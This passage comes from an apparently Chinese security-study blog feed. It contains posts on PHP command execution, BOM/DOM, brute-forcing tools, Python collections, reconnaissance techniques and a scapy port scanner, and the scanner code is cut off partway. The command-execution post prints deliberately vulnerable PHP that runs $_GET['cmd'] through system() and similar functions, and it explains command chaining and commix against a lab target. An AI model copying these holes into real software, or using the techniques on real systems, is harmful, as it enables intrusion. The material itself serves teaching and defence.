测试代码如下：</p>   <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;'</span>;    system($_GET[<span class="hljs-string">'cmd'</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no cmd input !'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>GET方式传入参数cmd=whoami，成功执行命令<br>   <img src="1.png" srcset="/img/loading.gif" alt=""></p><p><img src="2.png" srcset="/img/loading.gif" alt=""></p><ol start="2"><li><p>shell_exec()<br>将字符串作为系统命令执行，不输出结果<br>测试代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;    <span class="hljs-keyword">print</span> shell_exec($_GET[<span class="hljs-string">'cmd'</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no cmd input !'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>结果与system()，但没有使用&lt;pre&gt;标签，格式有所不同</p></li><li><p>exec()<br>将字符串作为系统命令执行，返回结果最后一行<br>如果添加第二个参数$array，就将每一行结果存入数组之中<br>测试代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;    exec($_GET[<span class="hljs-string">'cmd'</span>],$array);    print_r($array);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no cmd input !'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>执行whoami命令结果如下</p></li></ol><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><p><img src="3.png" srcset="/img/loading.gif" alt=""></p><ol start="4"><li><p>passthru()<br>与system()类似，将字符串作为系统命令执行，并且输出结果<br>无返回值，可以输出二进制数据<br>测试代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;    passthru($_GET[<span class="hljs-string">'cmd'</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no cmd input !'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></li><li><p>popen()<br>执行命令不返回命令结果，而是返回一个文件指针（需要有写权限）<br>测试代码如下：</p> <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;    $cmd=$_GET[<span class="hljs-string">'cmd'</span>].<span class="hljs-string">"&gt;&gt; 1.txt"</span>;    popen($cmd,r);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no cmd input !'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>执行whoami命令之后，生成了一个1.TXT文件，内容为命令结果<br><img src="4.png" srcset="/img/loading.gif" alt=""></p></li><li><p>反引号<br>反引号``内的字符串会被当做系统命令执行</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;    $cmd=$_GET[<span class="hljs-string">'cmd'</span>];  <span class="hljs-keyword">print</span> `$cmd`;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'no cmd input !'</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>同样可以执行系统命令</p></li></ol><h2 id="03-DVWA中的命令执行漏洞"><a href="#03-DVWA中的命令执行漏洞" class="headerlink" title="03 DVWA中的命令执行漏洞"></a>03 DVWA中的命令执行漏洞</h2><p>输入一个IP地址，即可执行ping命令</p><p><img src="5.png" srcset="/img/loading.gif" alt=""></p><p>源码：<br><img src="6.png" srcset="/img/loading.gif" alt=""></p><p>我们可以使用拼接的方法执行其他命令<br>如图，同时执行了ping和whoami命令</p><p><img src="7.png" srcset="/img/loading.gif" alt=""></p><p>可以使用自动化工具commix直接获取网站shell<br>commix -u “<a href="http://127.0.0.1/cmd.php?cmd=127.0.0.1&quot;" target="_blank" rel="noopener">http://127.0.0.1/cmd.php?cmd=127.0.0.1&quot;</a></p><h2 id="04-拼接符介绍"><a href="#04-拼接符介绍" class="headerlink" title="04 拼接符介绍"></a>04 拼接符介绍</h2><ul><li>windows下的拼接符：<ul><li>&amp; 前面语句为假则直接执行后边的</li><li>&amp;&amp; 前面的语句为假就终止执行</li><li>| 直接执行后边的语句</li><li>|| 前面出错执行后边的</li></ul></li><li>linux下的拼接符：<ul><li>；前面执行完执行后边的</li><li>&amp; 无论前边的语句真假都会执行</li><li>&amp;&amp; 只有前面语句为真，才会执行后边语句</li><li>|显示后边的执行结果</li><li>|| 前面出错执行后边的</li></ul></li></ul><h2 id="05-漏洞防范"><a href="#05-漏洞防范" class="headerlink" title="05 漏洞防范"></a>05 漏洞防范</h2><ol><li>减少相关函数的使用，并在disable_functions中禁用函数</li><li>执行命令前对参数进行过滤如escapeshellcmd(),escapeshellarg()</li><li>参数的值使用引号包裹，并使用addslashes函数转义</li><li>对参数设置白名单</li></ol>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>代码审计</tag>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BOM与DOM</title>
    <link href="/BOM%E4%B8%8EDOM/"/>
    <url>/BOM%E4%B8%8EDOM/</url>
    
    <content type="html"><![CDATA[<p>BOM与DOM的概念介绍</p><a id="more"></a><h1 id="BOM与DOM"><a href="#BOM与DOM" class="headerlink" title="BOM与DOM"></a>BOM与DOM</h1><p>DOM（document object model）：文档对象模型，提供操作页面元素的方法和属性</p><p>BOM（browser object model）；浏览器对象模型，提供一些属性和方法可以操作浏览器</p><p>DOM的最根本的对象是BOM的window对象的子对象document，可以说BOM包含了DOM</p><p>在 DOM 中，文档中的各个组件（component），可以通过 object.attribute 这种形式来访问。一个 DOM 会有一个根对象，这个对象通常就是 document</p><p>而 BOM 除了可以访问文档中的组件之外，还可以访问浏览器的组件，比如中的 navigator（导航条）、history（历史记录）等等</p><p><img src="https://user-gold-cdn.xitu.io/2019/9/10/16d191f327978675?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" srcset="/img/loading.gif" alt="img"></p><h2 id="01-BOM"><a href="#01-BOM" class="headerlink" title="01 BOM"></a>01 BOM</h2><p>浏览器对象模型<br>浏览器中的一个窗口就是一个BOM</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><h3 id="window对象"><a href="#window对象" class="headerlink" title="window对象"></a>window对象</h3><p>Window对象包含属性：document、location、navigator、screen、history、frames</p><p>Document根节点包含子节点：forms、location、anchors、images、links</p><p>一般情况下，window都可以省略<br>所有的属性、方法变量前都可以加上window，也可以省略</p><ul><li>window.alert(‘hello’);</li><li>confirm(‘确认框’);<br>点击确认时返回ture，取消返回false</li><li>prompt(‘输入框’);<br>第一个参数，面板上的显示内容<br>第二个参数（可选），默认值<br>返回值为输入的内容，无输入时返回null</li><li>open(url, name, string)<br>第一个参数，跳转的URL<br>第二个参数，给打开的窗口命名<br>第三个参数，一个特殊的字符串，可以设置新打开窗口的属性</li></ul><h3 id="history对象"><a href="#history对象" class="headerlink" title="history对象"></a>history对象</h3><p>当前窗口（而非浏览器）的历史记录，不同URL会产生不同的历史记录</p><ul><li>属性<br>history.length 输出当前窗口历史记录的条数</li><li>方法<ul><li>history.back() 与在浏览器点击后退按钮相同</li><li>history.forward() 与在浏览器点击后退按钮相同</li><li>history.go()<br>参数 ：0 刷新当前页面<pre><code>正数 前进n页负数 后退n页</code></pre></li></ul></li></ul><h3 id="location对象"><a href="#location对象" class="headerlink" title="location对象"></a>location对象</h3><p><strong>URL 统一资源定位符</strong><br>协议://IP(域名)/:端口号/路径/?查询字符串#锚点<br>protocol://hostname:port/pathname/?search#hash</p><ul><li>属性<ul><li>location.protocol 输出协议</li><li>location.hostname 输出主机名</li><li>location.pathname 输出路径和文件名</li><li>location.port 输出端口，一般是隐藏的</li><li>location.search 输出查询字符串，使用？开头，&amp;连接</li><li>location.hash 输出锚点</li></ul></li></ul><p>使用location输出的是对象，location.href输出的是字符串</p><p>window.location === window.document.location</p><ul><li>方法<ul><li>location.assign(url) 在当前窗口跳转到URL</li><li>location.replace(url) 在当前窗口替换成新的URL(不产生历史记录)</li><li>location.reload() 刷新当前窗口，添加参数true时不经过缓存，强制从服务器重载</li></ul></li></ul><h2 id="02-DOM"><a href="#02-DOM" class="headerlink" title="02 DOM"></a>02 DOM</h2><p>文档对象模型 document object model</p><p><img src="https://www.runoob.com/images/pic_htmltree.gif" srcset="/img/loading.gif" alt="DOM HTML tree"></p><ul><li>节点类型：<ul><li>元素节点  <div></div></li><li>属性节点 id=’div1’</li><li>文本节点 div文本</li></ul></li><li>节点的属性：<ul><li>innerHTML - 节点（元素）的文本值</li><li>parentNode - 节点（元素）的父节点</li><li>childNodes - 节点（元素）的子节点</li><li>attributes - 节点（元素）的属性节点</li></ul></li><li>元素节点的获取<ul><li>document .getElementById(“div1”);<br>功能：通过id获取符合条件的元素节点（id必须是唯一的）<br>返回值：符合条件的一个节点</li><li>document .getElementByName(name属性的值);<br>功能：通过name属性的值获取符合条件的元素节点<br>只能从全局即document开始，一般用在表单元素中</li><li>node.getElementByTagName(标签名);<br>功能：从node节点开始，通过标签名获取符合条件的元素节点<br>返回值：与数组类似，一般叫做伪数组或类数组</li><li>node.getElementByClassName(class名);<br>功能：从node节点开始，通过class名获取符合条件的元素节点<br>IE8以下不兼容</li><li>document.querySelector(字符串)<br>参数：css选择器格式字符串<br>返回值：符合条件的第一个节点</li><li>document.querySelectorAll(字符串)<br>参数：css选择器格式字符串<br>返回值：伪数组</li></ul></li><li>修改HTML元素<ul><li>document.getElementById(“p1”).innerHTML=”新文本!”;<br>改变一个 &lt;p&gt; 元素的 HTML 内容</li><li>document.getElementById(“p2”).style.color=”blue”;<br>改变一个段落的 HTML 样式</li><li>var node=document.createTextNode(“这是一个新段落。”); para.appendChild(node);<br>如需向 HTML DOM 添加新元素，您首先必须创建该元素（元素节点），然后把它追加到已有的元素上。</li><li>appendChild(node);<br>插入新的子节点（元素）</li><li>removeChild(node);<br>删除子节点（元素）</li></ul></li><li>DOM事件<ul><li>onclick=<em>JavaScript</em><br>当点击时执行js代码</li><li>onload=<em>JavaScript</em><br>当加载网页时执行js代码</li><li>onunload=<em>JavaScript</em><br>当离开网页时执行js代码</li><li>onchange=<em>JavaScript</em><br>当改变输入字段的内容时执行js代码</li><li>onmouseover=<em>JavaScript</em><br>当鼠标悬浮在此处时执行js代码</li><li>onmouseout=<em>JavaScript</em><br>当鼠标离开此处时执行js代码</li><li>onmousedown=<em>JavaScript</em><br>当鼠标按下时执行js代码</li><li>onmouseup=<em>JavaScript</em><br>当鼠标松开时执行js代码</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>暴力破解</title>
    <link href="/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>暴力破解的简单总结</p><a id="more"></a><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="01-暴力破解原理"><a href="#01-暴力破解原理" class="headerlink" title="01 暴力破解原理"></a>01 暴力破解原理</h2><p>用户使用自定义字典文件中的内容与验证程序交互，从而在枚举过程中得到正确数据，如破解用户名、密码，破解验证码</p><p>暴力破解的基础：</p><ol><li>应用程序或服务器未进行限制</li><li>具有内容涵盖全面的字典文件</li></ol><p>口令的隐患：</p><ol><li>弱口令<br>123456，password，姓名+生日等</li><li>默认口令<br>admin，root等</li><li>明文传输<br>HTTP，FTP，TELNET等数据流都是明文传递的</li></ol><h2 id="02-字典"><a href="#02-字典" class="headerlink" title="02 字典"></a>02 字典</h2><ol><li><p>常见的字典有：</p><ul><li><p>弱口令字典 </p></li><li><p>社工字典</p></li><li><p>子域名字典</p></li><li><p>默认口令字典</p></li><li><p>文件目录字典</p></li><li><p>常用变量名字典</p></li></ul></li><li><p>字典制作工具：</p><ul><li><p>cupp 需要使用python3运行</p><ul><li>-h 显示帮助信息</li><li>-i 以交互的方式制作用户密码字典文件</li><li>-w Filename 使用此选项配置现有字典</li><li>-l 从仓库下载大型字典文件</li><li>-a 直接从Alecto DB解析默认用户名和密码</li><li>-v 显示版本信息</li></ul></li><li><p>pydictor 兼容python2和3<br> <a href="https://github.com/LandGrey/pydictor/blob/master/README_CN.md" target="_blank" rel="noopener">帮助信息</a></p></li><li><p>dymerge</p><p>dymerge用来操作多个已有字典，重塑合并的工具</p><p>使用方法：</p><ul><li><strong>合并两个字典文件</strong> ./dymerge.py dic1.txt dic2.txt</li><li><strong>删除重复项</strong>./dymerge.py dic1.txt dic2.txt -u</li><li><strong>逆向字典</strong>./dymerge.py dic1.txt dic2.txt -r</li><li><strong>字母和数字排序</strong>./dymerge.py dic1.txt dic2.txt -s</li><li>-o 指定输出的文件名和目标</li><li>-z 定义为文件压缩输出</li></ul></li><li><p>crunch<br>在kali中自带,命令格式如下：</p><p>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</p></li></ul></li></ol><h2 id="03-破解工具"><a href="#03-破解工具" class="headerlink" title="03 破解工具"></a>03 破解工具</h2><ol><li><p>hydra</p><ul><li>-l 指定一个用户名</li><li>-p 指定一个密码</li><li>-L 指定用户名字典</li><li>-P 指定密码字典</li><li>-vV 显示爆破细节</li><li>-o 保存爆破结果</li><li>-f 找到正确的密码就停止爆破</li><li>-t 设置线程，默认为16</li><li>-e<ul><li>n null</li><li>s same</li><li>r 反向</li></ul></li></ul></li><li><p>burpsuite<br>抓包后使用intruder模块进行破解，共有四种爆破模式</p><ul><li><p>Sniper（狙击手）<br>如果设置了1个参数就依次尝试payload<br>如果设置了两个参数，先爆破第一个，第二个不变；再爆破第二个，第一个不变</p></li><li><p>Battering ram（攻城锤）<br>如果设置了1个参数就依次尝试payload<br>如果设置了两个参数，使用同样的payload同时对两个参数进行爆破</p></li><li><p>Pitchfork（草叉）<br>至少要两个参数，假设第一个参数payload为1，2，3，第二个参数payload为a，b，c，第一次爆破为1，a，第二次爆破为2，b，第三次爆破为3，c<br>如果两个参数的payload数量不同，取较小的值</p></li><li><p>Cluster bomb（集束炸弹）</p><p>取笛卡尔积<br>至少要两个参数，假设第一个参数payload为1，2，3，第二个参数payload为a，b，c，第一次爆破为1，a，第二次爆破为1，b，第三次爆破为1，c，第四次为2，a…以此类推，共9次</p></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python collections几个集合类</title>
    <link href="/python-collections%E5%87%A0%E4%B8%AA%E9%9B%86%E5%90%88%E7%B1%BB/"/>
    <url>/python-collections%E5%87%A0%E4%B8%AA%E9%9B%86%E5%90%88%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>python collections库提供了一些方便的集合类</p><a id="more"></a><h1 id="python-collections"><a href="#python-collections" class="headerlink" title="python collections"></a>python collections</h1><ol><li><p>namedtuple(‘名称’,[属性list])</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> collectionsPoint=collections.namedtuple(<span class="hljs-string">'Point'</span>,[<span class="hljs-string">'x'</span>,<span class="hljs-string">'y'</span>])p=Point(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)print(<span class="hljs-string">'x ='</span>,p.x)print(<span class="hljs-string">'y ='</span>,p.y)<span class="hljs-comment">#x = 1</span><span class="hljs-comment">#y = 2</span></code></pre></li><li><p>deque<br>为了实现高效插入和删除操作的双向列表，适合用于队列和栈</p><pre><code class="hljs python">q=collections.deque([<span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'c'</span>])q.append(<span class="hljs-string">'x'</span>)q.appendleft(<span class="hljs-string">'y'</span>)print(q)q.pop()q.popleft()print(q)<span class="hljs-comment">#deque(['y', 'a', 'b', 'c', 'x'])</span><span class="hljs-comment">#deque(['a', 'b', 'c'])</span></code></pre></li><li><p>defaultdict<br>可以设置字典key不存在时返回的默认值<br>dd=defaultdict(lambda:’Not exist’)<br>若key不存在就将返回Not exist</p><pre><code class="hljs python">dd=collections.defaultdict(<span class="hljs-keyword">lambda</span>:<span class="hljs-string">'Not exist'</span>)dd[<span class="hljs-string">'a'</span>]=<span class="hljs-number">1</span>print(dd[<span class="hljs-string">'a'</span>])print(dd[<span class="hljs-string">'b'</span>])<span class="hljs-comment">#1</span><span class="hljs-comment">#Not exist</span></code></pre></li><li><p>OrderedDict<br>按照key插入顺序排序，使字典变的有序</p><pre><code class="hljs python">od=collections.OrderedDict([(<span class="hljs-string">'c'</span>,<span class="hljs-number">1</span>),(<span class="hljs-string">'a'</span>,<span class="hljs-number">2</span>),(<span class="hljs-string">'b'</span>,<span class="hljs-number">3</span>)])print(od)print(od.keys())print(od.values())print(od[<span class="hljs-string">'a'</span>])<span class="hljs-comment">#OrderedDict([('c', 1), ('a', 2), ('b', 3)])</span><span class="hljs-comment">#odict_keys(['c', 'a', 'b'])</span><span class="hljs-comment">#odict_values([1, 2, 3])</span><span class="hljs-comment">#2</span></code></pre></li><li><p>Counter<br>用于统计字符串中每个字符出现的次数，区分大小写，空格也会被统计</p><pre><code class="hljs python">c=collections.Counter()text=<span class="hljs-string">'Hello John'</span><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> text:    c[ch]+=<span class="hljs-number">1</span>print(c)<span class="hljs-comment">#Counter(&#123;'l': 2, 'o': 2, 'H': 1, 'e': 1, ' ': 1, 'J': 1, 'h': 1, 'n': 1&#125;)</span></code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>几种信息收集方式</title>
    <link href="/%E5%87%A0%E7%A7%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E5%BC%8F/"/>
    <url>/%E5%87%A0%E7%A7%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>本文总结了Google Hacking、whois等常用的信息收集方式</p><a id="more"></a><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>信息收集主要针对目标的服务器系统、数据库系统、中间件系统、应用程序系统、以及边界设备等信息。以及针对系统管理员的信息收集。</p><p>信息收集的分类：</p><ol><li>主动信息收集：直接与目标进行交互，在交互过程中进行收集，如nmap、burpsuite站点地图收集</li><li>被动信息收集：通过第三方引擎与目标交互，或不与目标交互查询具体数据库，如googlehacking、shodan查询等</li></ol><h2 id="01-Google-Hacking"><a href="#01-Google-Hacking" class="headerlink" title="01 Google Hacking"></a>01 Google Hacking</h2><table><thead><tr><th>关键字</th><th>含义</th><th>举例</th></tr></thead><tbody><tr><td>site</td><td>指定搜索域名</td><td>Site:baidu.com</td></tr><tr><td>inurl</td><td>指定URL中是否存在某些关键字</td><td>Inure:.php?id=</td></tr><tr><td>intext</td><td>指定网页中是否存在某些关键字</td><td>Intext:网站管理</td></tr><tr><td>filetype</td><td>指定搜索文件类型</td><td>Filetype:txt</td></tr><tr><td>intitle</td><td>指定网页标题中是否存在某些关键字</td><td>Intitle:后台管理</td></tr><tr><td>link</td><td>指定网页链接</td><td>Link:baidu.com(指定与百度做了外链的站点)</td></tr><tr><td>Info</td><td>指定网页信息</td><td>Info:baidu.com</td></tr></tbody></table><h2 id="02-Whois"><a href="#02-Whois" class="headerlink" title="02 Whois"></a>02 Whois</h2><p>用于查询域名的IP以及所有者的详细信息，不同后缀名的域名需要使用不同的Whois信息，使用43端口、TCP</p><p>可以使用web接口或者命令行的方式进行查询 whois url</p><h2 id="03-子域名查询"><a href="#03-子域名查询" class="headerlink" title="03 子域名查询"></a>03 子域名查询</h2><p>subdomian name，顶级域名前加前缀的都是子域名<br>我国顶级域名 .cn 也是我国的一级域名<br>二级域名分为类别域名和行政区域名，类别域名有6个：科研机构.ac 工商金融企业.com 教育机构.edu 政府部门.gov 互联网络信息中心和运行中心.net 非盈利组织.org<br>行政区域名有34个</p><p><strong><em>主域名不存在漏洞时可以从子域名靠近主域名</em></strong></p><p>查询方式：</p><ol><li>maltego CE,wydomain,subDomainsBrute,dbsmaper,Layer子域名挖掘机</li><li>搜索引擎挖掘 google hack，输入site：sina.com</li><li>第三方网站查询  <a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a> , <a href="http://dns.aizhan,.com" target="_blank" rel="noopener">http://dns.aizhan,.com</a></li><li>证书透明度公开日志枚举 <a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a>  , <a href="http://censys.io/" target="_blank" rel="noopener">http://censys.io/</a></li></ol><h2 id="04-CDN"><a href="#04-CDN" class="headerlink" title="04 CDN"></a>04 CDN</h2><ol><li><p>CDN介绍<br>CDN（content delivery network）内容分发网络</p><p>无数据交互时根据用户所在地区访问相应的缓存服务器，只有需要交互时才访问真实的服务器</p></li><li><p>判断CDN是否存在一般存在于大型网络</p><p>通过ping判断是否存在 ping <a href="http://www.baihe.com" target="_blank" rel="noopener">www.baihe.com</a></p><p>通过设置代理或者利用在线ping网站使用不同地区的服务器进行ping操作</p></li><li><p>绕过CDN</p></li></ol><ul><li>如果目标没有使用CDN可以直接使用ping获取IP<br> 或者使用在线网站<a href="http://www.ip138.com" target="_blank" rel="noopener">http://www.ip138.com</a></li><li>如果有CDN，需要绕过获取真实IP地址<ol><li>内部邮箱源，收集到内部邮箱服务器IP地址</li><li>网站phpinfo.php文件</li><li>分站IP地址，查询子域名，CDN很贵，可能分站没有使用CDN</li><li>国外服务器进行ping <a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a></li><li>查询域名解析记录 <a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a></li></ol></li></ul><h2 id="05-CMS识别"><a href="#05-CMS识别" class="headerlink" title="05 CMS识别"></a>05 CMS识别</h2><ol><li><p>CMS介绍</p><p>各种CMS具有独特的结构命名规则和特定的文件内容，因此可以利用这些内容来获取CMS站点的具体软件CMS与版本<br>常见CMS：dedecms（织梦）、Discuz、phpcms</p></li><li><p>CMS识别工具</p><ul><li>在线工具 </li></ul><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a> </p><p><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></p><ul><li>本地工具</li></ul><p>What web,御剑web指纹识别程序，大禹CMS识别程序</p></li></ol><h2 id="06-敏感目录信息探测"><a href="#06-敏感目录信息探测" class="headerlink" title="06 敏感目录信息探测"></a>06 敏感目录信息探测</h2><p>探测工具：御剑后台扫描工具、wwwscan命令行工具、dirb命令行工具、dirbuster扫描工具、Dirmap、Nikto</p><h2 id="07-Shodan"><a href="#07-Shodan" class="headerlink" title="07 Shodan"></a>07 Shodan</h2><p><a href="https://www.shodan.io" target="_blank" rel="noopener">Shodan</a>不是在网上搜索网址，而是直接进入互联网的背后通道，寻找和互联网关联的服务器、摄像头、打印机、路由器等等，需要注册</p><ol><li>网页搜索<ul><li>在explore搜索框中输入webcam进行搜索使</li><li>用port关键字 如:port:22</li><li>使用关键字host 如:host:61.135.169.121</li><li>使用关键字city 如:city:hangzhou port:22</li></ul></li><li>命令行搜索<ul><li>安装命令行 pip install shodan</li><li>初始化 shodan init api</li><li>常用搜索：<ul><li>查询apache服务器的数量 shodan count apache </li><li>查询使用服务的主机信息 shodan search Microsoft iis 6.0 </li><li>获取指定IP地址信息 shodan host ip</li><li>获取当前帐号信息 shodan info</li><li>获取自身外部IP地址 shodan myip</li><li>检测是否有蜜罐 shodan honeyscore ip</li></ul></li></ul></li><li>使用shodan API编写python脚本进行查询</li></ol><pre><code class="hljs python"><span class="hljs-keyword">import</span> shodan<span class="hljs-keyword">import</span> sysAPI_KEY=<span class="hljs-string">"your key"</span><span class="hljs-keyword">if</span> len(sys.argv)==<span class="hljs-number">1</span>:  print(<span class="hljs-string">"Usage:%s &lt;search query&gt;"</span>%sys.argv[<span class="hljs-number">0</span>])    sys.exit[<span class="hljs-number">1</span>]  <span class="hljs-keyword">try</span>:    api=shodan.Shodan(API_KEY)    query=<span class="hljs-string">' '</span>.join(sys.argv[<span class="hljs-number">1</span>:])    result=api.search[query]        <span class="hljs-keyword">for</span> service <span class="hljs-keyword">in</span> result[<span class="hljs-string">'matches'</span>]:        print(service[<span class="hljs-string">'ip_str'</span>])<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:    print(<span class="hljs-string">"Error:%s"</span>%e)    sys.exit(<span class="hljs-number">1</span>)</code></pre>]]></content>
    
    
    <categories>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python编写端口扫描器</title>
    <link href="/Python%E7%BC%96%E5%86%99%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    <url>/Python%E7%BC%96%E5%86%99%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>使用scapy编写的扫描器，可以进行tcp与udp扫描</p><a id="more"></a><p>以命令行方式启动，多线程扫描</p><p>可以同时进行ICMP、ACK、SYN、FIN、UDP多种扫描</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> scapy.all <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> timescreenLock=Semaphore(value=<span class="hljs-number">1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">icmp_scan</span><span class="hljs-params">(ip)</span>:</span>    reply=sr1(IP(dst=ip)/ICMP(),timeout=<span class="hljs-number">5</span>)    <span class="hljs-keyword">if</span> reply:        <span class="hljs-keyword">if</span> reply[ICMP].type==<span class="hljs-number">0</span>:            print(<span class="hljs-string">'%s IMCP reply'</span>%ip)    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">'%s NO IMCP reply'</span>%ip)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">syn_scan</span><span class="hljs-params">(ip,port)</span>:</span>    screenLock.acquire()    reply=sr1(IP(dst=ip)/TCP(sport=RandShort(),dport=port,flags=<span class="hljs-string">'S'</span>),timeout=<span class="hljs-number">5</span>)    <span class="hljs-keyword">if</span> (reply <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>):        print(<span class="hljs-string">'%s : %s Filtered'</span>%(ip,port))    <span class="hljs-keyword">elif</span>(reply.haslayer(TCP)):        <span class="hljs-keyword">if</span>(reply.getlayer(TCP).flags==<span class="hljs-string">'SA'</span>):            print(<span class="hljs-string">'%s : %s Open'</span>%(ip,port))        <span class="hljs-keyword">elif</span>(reply.getlayer(TCP).flags==<span class="hljs-string">'RA'</span>):            print(<span class="hljs-string">'%s : %s Closed'</span> % (ip, port))    <span class="hljs-keyword">elif</span> (reply.haslayer(ICMP)):        <span class="hljs-keyword">if</span> (int(reply.getlayer(ICMP).type) == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> int(reply.getlayer(ICMP).code) <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">13</span>]):            print(<span class="hljs-string">'%s : %s Filtered'</span> % (ip, port))    screenLock.release()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ack_scan</span><span class="hljs-params">(ip,port)</span>:</span>    screenLock.acquire()    reply = sr1(IP(dst=ip) / TCP(sport=RandShort(), dport=port, flags=<span class="hljs-string">'A'</span>), timeout=<span class="hljs-number">5</span>)    <span class="hljs-keyword">if</span> (reply <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>):        print(<span class="hljs-string">'%s : %s Filtered'</span> % (ip, port))    <span class="hljs-keyword">elif</span> (reply.haslayer(TCP)):        <span class="hljs-keyword">if</span> (reply.getlayer(TCP).flags == <span class="hljs-string">'R'</span>):            print(<span class="hljs-string">'%s : %s Unfiltered'</span> % (ip, port))    <span class="hljs-keyword">elif</span>(reply.haslayer(ICMP)):        <span class="hljs-keyword">if</span>(int(reply.getlayer(ICMP).type)==<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> int(reply.getlayer(ICMP).code) <span class="hljs-keyword">in</span> [<span 